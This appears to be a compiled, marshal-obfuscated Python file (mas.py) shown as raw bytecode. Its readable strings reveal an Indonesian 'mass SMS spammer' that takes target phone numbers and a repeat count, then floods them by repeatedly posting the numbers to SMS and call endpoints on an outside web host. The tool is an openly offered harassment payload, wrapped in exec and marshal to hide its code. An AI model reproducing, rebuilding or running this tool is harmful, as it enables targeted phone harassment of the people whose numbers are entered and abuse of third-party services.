B
    �x]z	  �               @   s   d dl Z ee �d�� dS )�    Nsp  �               @   s�   d dl Z d dlZd dlZdZdd� Zed� e�d� ed� ee� ed��d	�Z	ed
�Z
ee� ed� y"e�d�jZejddeid� W n   Y nX y4x.e	D ]&Zx edee
�d �D ]
Ze�  q�W q�W W n ek
r�   e�  Y nX ee� dS )�    Nz===============================c              C   s"   t jddtid�j} tt| � d S )Nz0https://zpammers.000webhostapp.com/Spam/Spam.php�Nomer)�data)�requests�post�No�text�print�x)�r� r   � �Spam
   s    r   Z__________________________z*figlet -f digital 'Spams  Massal' | lolcatz�==[ Spammer SMS Massal ]==
Pisahkan Setiap Nomer Dengan Koma => (,)

Contoh Single => 085248767784
Contoh Massal => 085248767784,0896703368199z[?] Nomer Target : �,z[?] Jumlah Spams : z[+] Pleass Wait In Prosess ...
z.https://zpammers.000webhostapp.com/Spam/no.txtz0https://zpammers.000webhostapp.com/Spam/Call.phpr   )r   �   )Zrandomr   �os�Lr   r   �system�input�splitZNeZJu�getr   �Nr   r   �range�intr	   �ImportError�exitr   r   r   r   �<module>   s0   
 
)�marshal�exec�loads� r   r   �mas.py�<module>   s   